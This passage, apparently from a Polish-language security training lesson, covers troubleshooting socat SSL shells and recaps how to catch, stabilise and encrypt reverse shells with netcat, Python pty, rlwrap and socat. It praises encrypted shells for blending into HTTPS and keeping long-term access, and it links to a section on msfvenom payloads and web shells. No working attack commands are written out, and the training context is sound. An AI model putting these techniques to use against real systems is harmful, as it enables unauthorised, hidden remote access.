Nowoczesne systemy mają minimalny wpływ na wydajność, ale szyfrowane powłoki wykorzystują nieco więcej procesora i przepustowości niż połączenia tekstowe. Rzadko ma to wpływ na praktyczne operacje, ale może być zauważalne w systemach wbudowanych o ograniczonych zasobach.

## Rozwiązywanie problemów z połączeniami SSL

Jeśli połączenia SSL się nie powiodą, najpierw sprawdź, czy oba punkty końcowe obsługują OpenSSL. Następnie sprawdź możliwości protokołu SSL w programie SoCat `socat -V`i poszukaj obsługi OpenSSL na liście funkcji.

Problemy ze ścieżką certyfikatu są częste. Upewnij się, że plik certyfikatu istnieje i jest możliwy do odczytania przez proces socat. W razie wątpliwości użyj ścieżek bezwzględnych i sprawdź, czy uprawnienia do pliku zezwalają na dostęp.

W przypadku błędów „weryfikacja certyfikatu nie powiodła się” należy sprawdzić, czy oba punkty końcowe używają `verify=0`. Certyfikaty podpisane samodzielnie wymagają wyłączenia weryfikacji, aby działały poprawnie.

Teraz możesz przechwytywać, stabilizować i szyfrować zdalne powłoki na obuLinuxi systemy Windows. Oto, co omówiliśmy:

- **Odwróć powłoki i połącz je oraz sprawdź** , kiedy każde podejście działa, biorąc pod uwagę różnezapora sieciowakonfiguracje.
- **Netcat i socat** do nawiązywania połączeń powłoki, od szybkich i prostych nasłuchiwaczy po w pełni interaktywnePTYsesje.
- **Stabilizacja powłoki**`pty` przy użyciu modułu  Pythona  `rlwrap`i przydziału TTY socat w celu przekształcenia kruchej, surowej powłoki w coś użytecznego.
- **Szyfrowane powłoki** z obsługą OpenSSL socat umożliwiają obsługę ruchu w protokole TLS i integrację ze zwykłym protokołem HTTPS.

Sama powłoka to tylko punkt wyjścia. Prawdziwa wartość wynika z połączenia tych technik: przechwycenia odwróconej powłoki za pomocą netcata, ustabilizowania jej za pomocą Pythona i `stty`, a następnie przejścia na szyfrowane połączenie SOCAT w celu zapewnienia długoterminowego dostępu.

Następnie w [części poświęconej generowaniu i dostarczaniu ładunków powłoki](https://tryhackme.com/room/shellgenerationdelivery) omówiono sposób tworzenia ładunków, które generują te powłoki, w tym  `msfvenom`kody jednowierszowe dla systemów bez netcata oraz powłoki internetowe dla dostępu za pośrednictwem przeglądarki.
